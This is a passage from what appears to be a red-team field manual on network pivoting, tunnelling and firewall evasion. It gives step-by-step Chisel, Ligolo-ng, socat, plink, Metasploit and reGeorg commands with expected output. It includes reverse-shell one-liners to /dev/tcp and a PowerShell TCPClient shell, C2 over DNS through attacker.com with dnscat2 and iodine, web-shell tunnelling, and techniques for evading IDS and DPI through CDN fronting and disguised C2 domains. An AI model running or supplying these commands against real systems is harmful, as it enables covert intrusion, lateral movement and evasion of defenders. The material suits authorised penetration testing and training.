## 14. Chisel — Why It Exists and When to Use It

### Layman's Terms
Chisel is a **TCP/UDP tunnel over HTTP(S)**. SSH is blocked? Firewall only allows web traffic? No SSH binary on the target? Chisel solves all of this. It's a single binary (Go, works everywhere), creates an encrypted tunnel that looks like HTTPS traffic, and can work in both forward and reverse modes.

### Real-World Use Case
You get a webshell on a target machine. SSH is firewalled. HTTP/HTTPS outbound is allowed (web browsing works). Chisel client on target connects to Chisel server on your VPS via HTTPS (port 443) — the firewall sees it as regular HTTPS browsing. You now have a full SOCKS proxy into the target's internal network.

```bash
# ── DOWNLOAD CHISEL ───────────────────────────────────────────────
# Download from: https://github.com/jpillora/chisel/releases
# Always use matching versions (server and client must match)

# On Kali:
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz && mv chisel_1.9.1_linux_amd64 chisel
chmod +x chisel

# For Windows target: chisel_1.9.1_windows_amd64.gz
# For 32-bit Linux: chisel_1.9.1_linux_386.gz
# For ARM: chisel_1.9.1_linux_arm64.gz
```

---

## 15. Chisel SOCKS Proxy (Forward & Reverse)

```bash
# ══════════════════════════════════════════════════════════════════
# FORWARD MODE: Target can reach Kali (normal outbound allowed)
# ══════════════════════════════════════════════════════════════════
#
#  [Kali server]  ←── HTTPS ──  [Pivot client]
#  10.10.10.50:8080              10.10.10.100
#  SOCKS on :1080                connects out to Kali

# Step 1: Start Chisel SERVER on Kali:
./chisel server --port 8080 --reverse
# Expected:
# 2024/01/16 03:14:00 server: Reverse tunnelling enabled
# 2024/01/16 03:14:00 server: Fingerprint abc123...
# 2024/01/16 03:14:00 server: Listening on http://0.0.0.0:8080

# Step 2: Run Chisel CLIENT on pivot (connects to Kali):
# Transfer chisel to pivot: python3 -m http.server 8080 (on Kali)
# On pivot:
./chisel client 10.10.10.50:8080 R:socks
# R: = reverse (server-side SOCKS)
# socks = create SOCKS proxy
# Expected Kali output:
# 2024/01/16 03:14:05 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening

# Step 3: Use proxy on Kali:
# /etc/proxychains4.conf: socks5 127.0.0.1 1080
proxychains4 nmap -sT -Pn 192.168.1.0/24
proxychains4 crackmapexec smb 192.168.1.0/24 -u bob -p Password1!

# ══════════════════════════════════════════════════════════════════
# REVERSE MODE: Pivot can't reach Kali (strict egress firewall)
# Alternative: Pivot LISTENS, Kali connects to it
# ══════════════════════════════════════════════════════════════════

# Step 1: Start Chisel SERVER on pivot:
./chisel server --port 8080 --socks5
# Pivot listens on 8080 with SOCKS5 enabled

# Step 2: Run Chisel CLIENT on Kali (connects to pivot):
./chisel client 10.10.10.100:8080 socks
# Kali creates SOCKS proxy on localhost:1080 → pivot → internal
# Expected: SOCKS available at localhost:1080
```

---

## 16. Chisel Port Forwarding

```bash
# ── SINGLE PORT FORWARD (like SSH -L) ────────────────────────────
# Goal: Access RDP on 192.168.1.50:3389 via pivot

# Server on Kali (reverse mode):
./chisel server --port 8080 --reverse

# Client on pivot:
./chisel client 10.10.10.50:8080 R:13389:192.168.1.50:3389
# R:LOCAL_PORT:REMOTE_HOST:REMOTE_PORT
# Opens Kali:13389 → pivot → 192.168.1.50:3389

# Use RDP:
xfreerdp /v:localhost:13389

# ── MULTIPLE FORWARDS IN ONE COMMAND ─────────────────────────────
./chisel client 10.10.10.50:8080 \
    R:socks \                              # SOCKS proxy
    R:13389:192.168.1.50:3389 \           # RDP forward
    R:3306:192.168.1.60:3306 \            # MySQL forward
    R:8080:192.168.1.70:80               # Web app forward

# ── EXPOSE LOCAL SERVICE (like SSH -R) ────────────────────────────
# Expose Kali's local Metasploit listener via pivot:
./chisel client 10.10.10.50:8080 R:9999:localhost:4444
# pivot:9999 → Kali:4444
# Internal machines connecting to pivot:9999 reach Kali's listener!

# ── VERIFY CHISEL IS WORKING ──────────────────────────────────────
# On Kali — check SOCKS is listening:
ss -tlnp | grep 1080
# Expected: LISTEN 0 0 127.0.0.1:1080

# Test proxy works:
proxychains4 -q curl -s http://192.168.1.1/ | head -5
# Expected: HTML from internal router/server
```

---

## 17. Chisel Through Web Proxies & CDNs

```bash
# SCENARIO: Target environment routes all traffic through a corporate web proxy
# Chisel can work through this!

# ── THROUGH HTTP PROXY ────────────────────────────────────────────
# On pivot — if outbound goes through corporate proxy at 10.0.0.1:3128:
export HTTPS_PROXY=http://10.0.0.1:3128
./chisel client --proxy https://10.0.0.1:3128 10.10.10.50:8080 R:socks
# Chisel uses the corporate proxy to reach your C2 server!

# ── USE CLOUDFLARE/CDN AS COVER ───────────────────────────────────
# Put Chisel server behind Cloudflare → traffic looks like CDN traffic
# 1. Point your domain to Kali via Cloudflare (or any CDN)
# 2. Enable "Proxied" in Cloudflare DNS settings
# 3. Run Chisel server on Kali listening on port 443
# 4. Client connects to your domain (via Cloudflare CDN):
./chisel client https://yourcdndomain.com R:socks
# Traffic: Pivot → Cloudflare CDN → Your Kali
# FW/IDS sees: Target → Cloudflare (looks like legit HTTPS traffic!)

# ── WEBSOCKET THROUGH NGINX ───────────────────────────────────────
# If Kali is behind Nginx, configure Nginx to proxy Chisel:
# /etc/nginx/conf.d/chisel.conf:
# server {
#     listen 443 ssl;
#     ssl_certificate ...;
#     ssl_certificate_key ...;
#     location / {
#         proxy_pass http://127.0.0.1:8080;
#         proxy_http_version 1.1;
#         proxy_set_header Upgrade $http_upgrade;
#         proxy_set_header Connection "upgrade";
#     }
# }
# Now: Chisel client → HTTPS:443 to your domain → Nginx → Chisel server
```

---

# PART 5 — LIGOLO-NG (ROUTING PIVOT)

---

## 18. Ligolo-ng — The Modern Standard

### Layman's Terms
Ligolo-ng creates a **virtual network interface on your machine** that routes traffic directly to the target's network — without proxychains, without any special tool support. Any tool that can use a network interface (which is everything) works directly. It's like joining the target's network from Kali.

### Why Ligolo-ng is Superior

```
PROXYCHAINS APPROACH:
  - Every tool must go through proxychains
  - Tools that don't support TCP-connect scans break
  - UDP doesn't work
  - DNS resolution issues
  - Slow for large-scale scanning
  - Must prefix every command with proxychains4

LIGOLO-NG APPROACH:
  - Creates a TUN interface (ligolo0) on Kali
  - Add a route: 192.168.1.0/24 → ligolo0
  - NOW: nmap, curl, ping, literally anything works NATIVELY
  - No proxychains needed
  - UDP works
  - DNS works
  - Full network-level access
  - As fast as the tunnel allows
```

---

## 19. Ligolo-ng Setup — Agent & Proxy

```bash
# ── DOWNLOAD LIGOLO-NG ────────────────────────────────────────────
# https://github.com/nicocha30/ligolo-ng/releases
# Two binaries needed:
# proxy  = runs on KALI (the proxy/server)
# agent  = runs on PIVOT (the agent/client)

# On Kali:
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
tar xzf ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
chmod +x proxy

# Agent for Linux pivot:
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_linux_amd64.tar.gz
# Agent for Windows pivot:
# ligolo-ng_agent_0.6.2_windows_amd64.zip

# ── STEP 1: SET UP TUN INTERFACE ON KALI ──────────────────────────
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
# Expected:
# 5: ligolo: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc...

# ── STEP 2: START PROXY ON KALI ───────────────────────────────────
./proxy -selfcert -laddr 0.0.0.0:11601
# -selfcert = generate self-signed cert (no need for real cert)
# -laddr = listen address and port
# Expected:
# INFO[0000] ligolo-ng starting...
# INFO[0000] Agent key: abc123def456...
# INFO[0000] Listening...

# ── STEP 3: RUN AGENT ON PIVOT ────────────────────────────────────
# Transfer agent to pivot (via SCP, HTTP server, etc.)
# On pivot:
./agent -connect 10.10.10.50:11601 -ignore-cert
# Expected on Kali:
# INFO[0005] Agent joined. name=user@pivot os=linux arch=amd64

# ── STEP 4: SET UP TUNNEL IN LIGOLO CONSOLE ───────────────────────
# In the ligolo proxy console (after agent connects):
ligolo-ng » session
# Expected:
# ? Specify a session : 1 - user@pivot - 10.10.10.100:XXXXX

ligolo-ng » [agent: user@pivot] » start
# Expected:
# INFO[0010] Starting tunnel to user@pivot

# ── STEP 5: ADD ROUTE TO TARGET NETWORK ───────────────────────────
# On Kali (in a new terminal):
# Add route for target internal network:
sudo ip route add 192.168.1.0/24 dev ligolo
# Expected: route added (no output = success)

# Verify:
ip route | grep ligolo
# Expected: 192.168.1.0/24 dev ligolo scope link

# ── STEP 6: USE IT — NO PROXYCHAINS NEEDED! ───────────────────────
# Direct access to internal network:
ping 192.168.1.10               # ICMP works! (no proxychains ever could)
nmap -sV 192.168.1.10           # SYN scan works! (no -sT needed)
curl http://192.168.1.100/      # HTTP directly
ssh user@192.168.1.50           # Direct SSH
evil-winrm -i 192.168.1.50 -u bob -p Password1!   # No proxychains!
crackmapexec smb 192.168.1.0/24 -u bob -p Password1!  # Full subnet sweep!

# This is DRAMATICALLY easier and more capable than proxychains!

# ── ADDING LISTENER (for reverse shells FROM internal network) ────
# You want a reverse shell from 192.168.1.50 to reach Kali:
# Without listener: 192.168.1.50 can't reach Kali's 10.10.10.50
# With listener: Ligolo relays the connection through the tunnel

# In ligolo console:
ligolo-ng » [agent: user@pivot] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
# pivot listens on :4444 → forwards to Kali:4444

# On Kali: start listener
nc -lvnp 4444

# Trigger reverse shell on 192.168.1.50 pointing to pivot:4444:
# bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
# Shell arrives on Kali!
```

---

## 20. Ligolo-ng Double Pivot (Two Hops)

```bash
# TOPOLOGY:
# Kali → Pivot1 (10.10.10.100) → Pivot2 (192.168.1.50) → DeepNetwork (10.0.1.0/24)
# Goal: Access 10.0.1.0/24 from Kali

# ── FIRST HOP (already set up) ────────────────────────────────────
# Agent on Pivot1, route to 192.168.1.0/24 via ligolo — done (see above)

# ── SECOND HOP ────────────────────────────────────────────────────
# Step 1: Create a second TUN interface for hop2:
sudo ip tuntap add user $(whoami) mode tun ligolo2
sudo ip link set ligolo2 up

# Step 2: From Kali, access Pivot2 (192.168.1.50) via Pivot1
# (Ligolo already routes 192.168.1.0/24 through hop1)

# Step 3: Start a second proxy on Kali listening on different port:
./proxy -selfcert -laddr 0.0.0.0:11602
# Different port from first proxy (11601 vs 11602)

# Step 4: Upload agent to Pivot2 via Pivot1:
# Since 192.168.1.50 is now reachable via first tunnel:
scp agent user@192.168.1.50:/tmp/
# OR: from your shell on Pivot1, download agent to Pivot2

# Step 5: On Pivot2 — connect to Kali's second proxy:
./agent -connect 10.10.10.50:11602 -ignore-cert
# (10.10.10.50 is reachable from Pivot2 via Pivot1's network... 
#  OR use -connect 192.168.1.100:11601 and add a listener on Pivot1)

# ALTERNATIVE — Pivot1 relays for Pivot2:
# In ligolo console for Pivot1:
ligolo-ng » [agent: user@pivot1] » listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11602
# Pivot1:11602 → Kali:11602

# On Pivot2:
./agent -connect 192.168.1.100:11602 -ignore-cert
# Pivot2 → Pivot1:11602 → Kali:11602

# Step 6: Add route to second internal network:
sudo ip route add 10.0.1.0/24 dev ligolo2

# Step 7: Use second network directly:
nmap -sV 10.0.1.10    # Scanning deep internal network!
ssh user@10.0.1.50    # Connecting to third segment!
```

---

## 21. Ligolo-ng on Windows

```powershell
# SCENARIO: Your pivot host is Windows
# Same concept, slightly different setup

# Download agent for Windows:
# ligolo-ng_agent_0.6.2_windows_amd64.zip → agent.exe

# Transfer to Windows pivot:
# (Via RDP clipboard, SMB share, web download, etc.)
certutil.exe -urlcache -split -f http://10.10.10.50:8080/agent.exe C:\Windows\Temp\agent.exe

# Run agent on Windows pivot:
C:\Windows\Temp\agent.exe -connect 10.10.10.50:11601 -ignore-cert
# Expected on Kali:
# INFO[0005] Agent joined. name=CORP\bob@WS01 os=windows arch=amd64

# Back on Kali — everything else is the same:
ligolo-ng » session
ligolo-ng » start
sudo ip route add 192.168.1.0/24 dev ligolo

# Direct access from Kali to Windows internal network!
nmap -sV 192.168.1.10
evil-winrm -i 192.168.1.50 -u carol -p Password1!

# ADDING LISTENER FOR WINDOWS REVERSE SHELLS:
# In ligolo console:
ligolo-ng » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
# On internal target: powershell -c "$client = New-Object Net.Sockets.TCPClient('192.168.1.100',4444);..."
# Shell arrives on Kali nc -lvnp 4444!
```

---

# PART 6 — OTHER PIVOTING TOOLS

---

## 22. Netsh (Windows Built-in Port Forward)

```cmd
:: netsh portproxy: Windows built-in port forwarding
:: NO extra tools needed — uses built-in Windows networking
:: Requires: Admin privileges
:: Persists across reboots (stored in registry)!

:: ── BASIC PORT FORWARD ────────────────────────────────────────────
:: Forward local port 13389 to remote RDP:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=13389 connectaddress=192.168.1.50 connectport=3389
:: Any connection to THIS machine:13389 → forwarded to 192.168.1.50:3389

:: ── LIST CURRENT FORWARDS ─────────────────────────────────────────
netsh interface portproxy show all
:: Expected:
:: Listen on ipv4:             Connect to ipv4:
:: Address    Port             Address         Port
:: 0.0.0.0   13389            192.168.1.50    3389

:: ── REMOVE A FORWARD ──────────────────────────────────────────────
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=13389

:: ── ALLOW THROUGH WINDOWS FIREWALL ───────────────────────────────
:: You need to open the port in Windows Firewall too:
netsh advfirewall firewall add rule name="PortForward13389" protocol=TCP dir=in localport=13389 action=allow

:: ── PRACTICAL USE CASE ────────────────────────────────────────────
:: You have a shell on Windows machine WS01 (10.10.10.100)
:: WS01 can reach internal 192.168.1.0/24
:: You want to RDP to 192.168.1.50 from Kali

:: On WS01 (your pivot):
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=13389 connectaddress=192.168.1.50 connectport=3389
netsh advfirewall firewall add rule name="FWD" protocol=TCP dir=in localport=13389 action=allow

:: From Kali:
xfreerdp /v:10.10.10.100:13389 /u:administrator /p:Password1!
:: Connected to 192.168.1.50's RDP through WS01!

:: ── CLEANUP ───────────────────────────────────────────────────────
:: Clean up after engagement:
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=13389
netsh advfirewall firewall delete rule name="FWD"
```

---

## 23. Socat — The Duct Tape of Pivoting

```bash
# Socat: bidirectional data relay between two endpoints
# No Go binary needed, available on most Linux systems
# Can be used without any special setup

# ── BASIC PORT RELAY ──────────────────────────────────────────────
# Forward: any connection to MY_PORT → TARGET:TARGET_PORT
socat TCP-LISTEN:13389,fork,reuseaddr TCP:192.168.1.50:3389 &
# fork = handle multiple connections
# reuseaddr = reuse port immediately after close
# & = background

# From Kali: connect to pivot_IP:13389 → reaches internal RDP!
xfreerdp /v:10.10.10.100:13389

# ── RELAY MULTIPLE SERVICES ────────────────────────────────────────
socat TCP-LISTEN:13389,fork TCP:192.168.1.50:3389 &
socat TCP-LISTEN:3306,fork TCP:192.168.1.60:3306 &
socat TCP-LISTEN:8080,fork TCP:192.168.1.70:80 &
# Three services forwarded simultaneously

# ── KILL SOCAT RELAYS ─────────────────────────────────────────────
# List:
ps aux | grep socat
# Kill:
pkill socat    # Kill all socat processes
kill PID       # Kill specific one

# ── SOCAT WITH UDP ────────────────────────────────────────────────
# Forward UDP (something SSH can't do):
socat UDP-LISTEN:53,fork UDP:192.168.1.10:53
# Forward DNS queries to internal DNS server!
# Now use: dig @pivot_IP internal.corp.local

# ── SOCAT FOR REVERSE SHELL THROUGH PIVOT ─────────────────────────
# Scenario: Internal machine can only reach Pivot, not Kali
# Pivot relays reverse shell to Kali

# On Kali — listener:
nc -lvnp 4444

# On pivot — create relay:
socat TCP-LISTEN:4445,fork TCP:10.10.10.50:4444 &
# pivot:4445 → Kali:4444

# On internal target — reverse shell to PIVOT:
bash -i >& /dev/tcp/192.168.1.100/4445 0>&1
# Shell goes: internal → pivot:4445 → Kali:4444 → You catch it!

# ── SOCAT FOR ENCRYPTED TUNNEL ────────────────────────────────────
# Create SSL/TLS encrypted tunnel (harder to inspect):
# On Kali (server):
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=localhost"
socat OPENSSL-LISTEN:443,cert=cert.pem,key=key.pem,verify=0,fork TCP:192.168.1.50:3389

# On external host (client):
socat TCP-LISTEN:13389,fork OPENSSL:10.10.10.100:443,verify=0
# External:13389 → Encrypted tunnel → Internal:3389
```

---

## 24. Plink (PuTTY Link — Windows SSH)

```cmd
:: Plink is PuTTY's command-line SSH tool
:: Use when: on Windows, no SSH binary, need SSH tunneling
:: Download: https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
:: plink.exe (~1MB) — single binary, no install

:: ── REMOTE PORT FORWARD (expose Kali listener via pivot) ──────────
:: Catch reverse shell from machines that can only reach THIS Windows box:
plink.exe -R 9001:127.0.0.1:4444 -N -batch user@10.10.10.50
:: Windows machine → creates reverse tunnel to Kali
:: pivot:9001 → Kali:4444
:: Target shells connect to pivot:9001 → arrive at Kali nc -lvnp 4444

:: ── DYNAMIC FORWARD (SOCKS proxy) ────────────────────────────────
plink.exe -D 1080 -N -batch user@10.10.10.50
:: SOCKS on Windows:1080 → Kali acts as proxy

:: ── LOCAL FORWARD ─────────────────────────────────────────────────
plink.exe -L 13389:192.168.1.50:3389 -N -batch user@10.10.10.50
:: Windows:13389 → Kali → 192.168.1.50:3389

:: ACCEPT HOST KEY (first connection):
echo y | plink.exe -R 9001:127.0.0.1:4444 -batch user@10.10.10.50
:: echo y pipes "yes" to accept the host key prompt

:: BACKGROUND PLINK:
start /b plink.exe -R 9001:127.0.0.1:4444 -N -batch user@10.10.10.50
:: start /b = background process

:: WITH PASSWORD (avoid interactive prompt):
plink.exe -pw "Password1!" -R 9001:127.0.0.1:4444 -N -batch user@10.10.10.50
:: OPSEC: Password visible in process list! Better: use key auth
```

---

## 25. Rpivot — Reverse SOCKS Proxy

```bash
# Rpivot creates a reverse SOCKS proxy
# Useful when: target can't accept inbound connections but can reach your server
# Python-based: works anywhere Python exists

# Download: https://github.com/klsecservices/rpivot
git clone https://github.com/klsecservices/rpivot

# ── SETUP ─────────────────────────────────────────────────────────
# On Kali (server):
python3 server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-port 1080
# Kali:9999 = where client connects
# Kali:1080 = SOCKS proxy created here

# On pivot (client):
# Transfer client.py to pivot
python3 client.py --server-ip 10.10.10.50 --server-port 9999
# Expected:
# Backconnect SOCKS proxy started at 10.10.10.50:9999
# Establishing SOCKS... done

# Use on Kali:
proxychains4 curl http://192.168.1.10/
# proxychains uses localhost:1080 → rpivot server → pivot client → target
```

---

## 26. Metasploit Pivoting

```ruby
# SCENARIO: You have a Meterpreter session on pivot
# Want to reach internal network without extra tools

# ── ADD ROUTE VIA METERPRETER ──────────────────────────────────────
# In Metasploit console:
use post/multi/manage/autoroute
set SESSION 1      # Your meterpreter session ID
set SUBNET 192.168.1.0/24
set NETMASK 255.255.255.0
run
# Expected:
# [+] Route added to subnet 192.168.1.0/24 from host's routing table.

# OR directly:
route add 192.168.1.0 255.255.255.0 1
# Format: route add SUBNET NETMASK SESSION_ID

# View routes:
route print

# ── SOCKS PROXY VIA METASPLOIT ─────────────────────────────────────
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5       # SOCKS version (4 or 5)
set SRVHOST 127.0.0.1
run -j              # Run as background job

# Now use proxychains with localhost:1080 to reach internal network!

# ── PORT FORWARD VIA METERPRETER ──────────────────────────────────
# Local forward (access internal RDP from Kali):
portfwd add -l 13389 -p 3389 -r 192.168.1.50
# -l = local port (on Kali)
# -p = remote port
# -r = remote host

# Reverse forward (expose internal port on Kali):
portfwd add -R -l 4444 -p 9001 -r 192.168.1.100
# Kali:4444 → pivot:9001 (pivot listens, internal connects there)

# List forwards:
portfwd list

# Delete forward:
portfwd delete -l 13389 -p 3389 -r 192.168.1.50

# ── SCAN THROUGH ROUTE ─────────────────────────────────────────────
# After adding route, Metasploit modules work directly:
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 22,80,443,445,3389
set THREADS 10
run
# Scans internal network through meterpreter route!
```

---

# PART 7 — DNS & ICMP TUNNELING

---

## 27. DNS Tunneling for C2 & Data Exfil

> **Reference:** DNS tunneling mechanism covered in `Ports_Protocols_RedTeam_Field_Manual.md` Section 8. Operator usage here:

```bash
# SCENARIO: All outbound TCP/UDP blocked EXCEPT DNS (port 53)
# Extremely common in isolated/air-gapped networks
# DNS is almost never blocked — it must work for any internet connectivity

# ── DNSCAT2 (C2 over DNS) ─────────────────────────────────────────
# Server setup (requires controlling a domain with NS record):

# DNS setup (at your domain registrar):
# ns1.attacker.com = YOUR_VPS_IP
# tunnel.attacker.com NS ns1.attacker.com
# (All DNS queries for *.tunnel.attacker.com go to YOUR VPS)

# On your VPS (DNS server):
gem install dnscat2
dnscat2-server tunnel.attacker.com
# Expected:
# Dnscat2 DNS server started on port 53

# On target (even through most firewalls):
# Linux:
./dnscat tunnel.attacker.com
# Windows:
dnscat2-v0.07-client-win32.exe tunnel.attacker.com
# Expected on server:
# New session established: 1 (ENCRYPTED)
# dnscat2>

# In dnscat2 console:
dnscat2> sessions
# 1 - dns1 - 10.10.10.100:XXXXX
dnscat2> session -i 1
# command (victim) 1> shell
# Session 2 created!
dnscat2> session -i 2
# Sends commands, gets responses — all via DNS queries!

# Create TCP tunnel through DNS (for pivoting!):
dnscat2> session -i 1
# command> listen 127.0.0.1:13389 192.168.1.50:3389
# Forwards Kali:13389 → DNS tunnel → target → 192.168.1.50:3389!
# xfreerdp /v:localhost:13389 (even through DNS-only environment!)

# ── IODINE (IP-over-DNS — full IP tunnel) ──────────────────────────
# More powerful than dnscat2 — creates actual IP tunnel
# Gives full network connectivity over DNS

# Server setup (on VPS with DNS control):
sudo iodined -f 10.0.0.1 tunnel.attacker.com -P password
# 10.0.0.1 = tunnel IP for server end
# Creates tunnel network 10.0.0.0/8

# Client (on target/pivot):
sudo iodine -f -P password tunnel.attacker.com
# Expected:
# Tunnel DNS: tunnel.attacker.com
# Got IP: 10.0.0.2
# Connection established

# Now: target has IP 10.0.0.2, server has 10.0.0.1
# Full TCP/IP over DNS!
ssh user@10.0.0.1  # SSH through DNS tunnel!
```

---

## 28. ICMP Tunneling — Traffic in Ping Packets

```bash
# SCENARIO: ICMP is allowed (ping works) but TCP/UDP is blocked
# Unusual but seen in some industrial/OT networks and strict environments

# ── PTUNNEL-NG ────────────────────────────────────────────────────
# Install:
sudo apt install ptunnel-ng -y

# Server side (on VPS or target):
sudo ptunnel-ng -r 10.10.10.50 -rp 22
# -r = redirect to this IP/port
# -rp = redirect port
# Listens for ICMP and forwards to localhost:22

# Client side:
sudo ptunnel-ng -p 10.10.10.50 -lp 8022 -da 127.0.0.1 -dp 22
# -p = proxy server (the ptunnel-ng server)
# -lp = local listening port
# -da = destination address (as seen from server)
# -dp = destination port

# Now connect via ICMP tunnel:
ssh -p 8022 user@localhost
# SSH traffic encapsulated in ICMP packets → bypasses TCP/UDP restrictions!

# ── ICMPTUNNEL ────────────────────────────────────────────────────
# Creates full IP tunnel over ICMP (more powerful)
git clone https://github.com/jamesbarlow/icmptunnel
cd icmptunnel && make

# Server:
sudo ./icmptunnel -s
# Client:
sudo ./icmptunnel VPS_IP
# Creates tun0 interface with 10.0.0.1/10.0.0.2 IPs
# Full network access over ICMP!
```

---

## 29. HTTP/HTTPS Tunneling

```bash
# SCENARIO: Only HTTP/HTTPS allowed, target has a web server
# Use web shell as relay point

# ── REGEORG (SOCKS through web shell) ──────────────────────────────
# Upload the PHP/ASP/ASPX tunnel file to a web server you've compromised:
# https://github.com/sensepost/reGeorg

# PHP tunnel file (upload to web server):
# wget https://raw.githubusercontent.com/sensepost/reGeorg/master/tunnel.php

# After uploading:
python3 reGeorgSocksProxy.py -p 1080 -u http://10.10.10.100/tunnel.php
# Expected:
# [INFO ] Listening for SOCKS5 connections on port 1080
# [INFO ] reGeorg listener ready on http://10.10.10.100/tunnel.php

# Use proxychains through it:
# /etc/proxychains4.conf: socks5 127.0.0.1 1080
proxychains4 curl http://192.168.1.10/
# HTTP requests → web shell → internal network!

# ── GOST (Universal Tunnel) ────────────────────────────────────────
# GOST: GO Simple Tunnel — supports HTTP, HTTPS, SOCKS, SSH, etc.
# https://github.com/ginuerzh/gost

# HTTP CONNECT tunnel:
# On pivot: start GOST as HTTP proxy
./gost -L http://0.0.0.0:8080

# On Kali: use it
curl --proxy http://10.10.10.100:8080 http://192.168.1.10/

# GOST SOCKS over HTTPS:
./gost -L socks5+tls://0.0.0.0:443  # SOCKS5 over TLS on port 443
# Looks like HTTPS to firewall!
# Client: ./gost -L :1080 -F socks5+tls://10.10.10.100:443
```

---

# PART 8 — FIREWALL EVASION

---

## 30. Detecting What's Blocked

```bash
# Before choosing your tunneling approach, map what's allowed:

# ── TEST OUTBOUND CONNECTIVITY ─────────────────────────────────────
# From the pivot, test which ports can reach your Kali:

# Setup: On Kali, listen on multiple ports:
for port in 22 53 80 443 4444 8080 8443; do
    nc -lvnp $port &
done

# On pivot — test each:
for port in 22 53 80 443 4444 8080 8443; do
    (echo >/dev/tcp/10.10.10.50/$port) &>/dev/null 2>&1 && \
        echo "Port $port: OPEN (outbound allowed!)" || \
        echo "Port $port: BLOCKED"
done 2>/dev/null

# Expected output example:
# Port 22: BLOCKED
# Port 53: OPEN (outbound allowed!)
# Port 80: OPEN (outbound allowed!)
# Port 443: OPEN (outbound allowed!)
# Port 4444: BLOCKED
# Port 8080: BLOCKED
# Port 8443: OPEN (outbound allowed!)

# DECISION:
# 53 only → DNS tunnel (dnscat2/iodine)
# 80/443 only → Chisel over HTTP/HTTPS, reGeorg
# 443 only → Chisel, OpenVPN over HTTPS, any HTTPS-based tool
# Any port → SSH, netcat, socat, anything

# ── TEST WHAT PROTOCOLS ARE ALLOWED ───────────────────────────────
# Test ICMP (ping):
ping -c 3 10.10.10.50
# Allowed? → ICMP tunneling possible

# Test UDP:
ncat -u 10.10.10.50 53 <<< "test"
# Allowed? → DNS, UDP-based tunnels possible

# Test if DPI is filtering content (deep packet inspection):
# If SSH on port 22 is blocked but port 443 works, try SSH on 443:
ssh -p 443 user@10.10.10.50
# If this works → simple port blocking, not DPI
# If this also fails → DPI inspecting content (need HTTPS-looking traffic)
```

---

## 31. Source Port Manipulation

```bash
# Some firewalls allow traffic FROM certain "trusted" source ports
# e.g., DNS responses come FROM port 53
# Firewall may allow traffic from source port 53 (or 80, 443)

# nmap with source port:
sudo nmap --source-port 53 -sS 192.168.1.50
sudo nmap --source-port 80 -sS 192.168.1.50
# If one of these succeeds when normal scan fails → source port restriction

# Connect back from specific source port:
ncat --source-port 53 10.10.10.50 4444
# If firewall allows traffic from :53 → your shell works!

# Chisel with specific source port:
./chisel client --keepalive 25s \
  10.10.10.50:443 R:socks
# Chisel's traffic comes from ephemeral port — but destination port matters more

# hping3 source port manipulation:
sudo hping3 --spoof 10.10.10.50 --udp -p 53 -s 53 target
```

---

## 32. Protocol Encapsulation Strategies

```bash
# STRATEGY 1: SSH over HTTPS (port 443)
# Many organizations allow 443 — SSH looks different to DPI
# Add to /etc/ssh/sshd_config on your server:
# Port 443  (or run sshd on 443 alongside nginx with SNI routing)

# With SSLH (multiplexer — serves SSH and HTTPS on same port):
# On VPS: sudo apt install sslh
# /etc/sslh.cfg: { host: "0.0.0.0"; port: "443"; protocol: "tls"; }
# Routes: TLS to HTTPS backend, SSH to OpenSSH

# STRATEGY 2: OpenVPN over TCP 443
# OpenVPN over TCP:443 is very difficult to block without breaking HTTPS
# Setup: --port 443 --proto tcp in OpenVPN server config
# Once connected: full network access, all traffic tunneled

# STRATEGY 3: WireGuard (UDP but very evasion-friendly)
# UDP 51820 by default — change to 443/53 for better bypass
# Traffic is encrypted, short packets — hard to fingerprint as VPN
# sudo wg-quick up wg0  (after config from Section 22 of ports module)

# STRATEGY 4: Websockets (HTTP upgrade)
# Websocket connections start as HTTP then "upgrade"
# Passes through most HTTP proxies
# Chisel uses websockets internally → works through web proxies!

# STRATEGY 5: QUIC (HTTP/3 over UDP)
# Some modern firewalls don't inspect UDP 443 yet
# Go-based tools can use QUIC for harder-to-detect tunnels
```

---

## 33. Evading Deep Packet Inspection (DPI)

```bash
# DPI identifies traffic by CONTENT, not just port
# Techniques to evade:

# TECHNIQUE 1: Domain Fronting
# Route traffic through a legitimate CDN (Cloudflare, AWS CloudFront)
# CDN sees request for allowed domain, but routes to your server
# DPI sees: → cloudflare.com (allowed)
# Actual destination: → your C2 server (hidden)

# TECHNIQUE 2: Traffic Padding and Timing
# DPI identifies protocols by timing patterns
# Add random delays: ssh -o ServerAliveInterval=3 user@pivot
# Traffic mimics interactive user session better

# TECHNIQUE 3: Certificate Pinning Evasion
# Use a real domain with valid Let's Encrypt certificate
# DPI sees: valid HTTPS to real domain
# certbot --nginx -d your-domain.com  → valid cert
# Run Chisel/C2 at your valid domain

# TECHNIQUE 4: Mimicking Legitimate Protocols
# Many C2 frameworks offer HTTP profile customization:
# Cobalt Strike: malleable C2 profiles (mimic Gmail, Bing, etc.)
# Sliver: HTTP/HTTPS/DNS/MTLS profiles
# Configure headers to look exactly like real traffic from legitimate apps

# TECHNIQUE 5: HTTPS Certificate Common Name
# DPI checks SNI (Server Name Indication) in TLS handshake
# Use a believable domain name: windowsupdate.contoso-internal.com
# Much less suspicious than: c2.attacker.xyz
```

---

# PART 9 — FULL MULTI-HOP SCENARIOS

---

## 34. Three-Hop Scenario: Internet → DMZ → Internal → AD

```bash
# ══════════════════════════════════════════════════════════════════
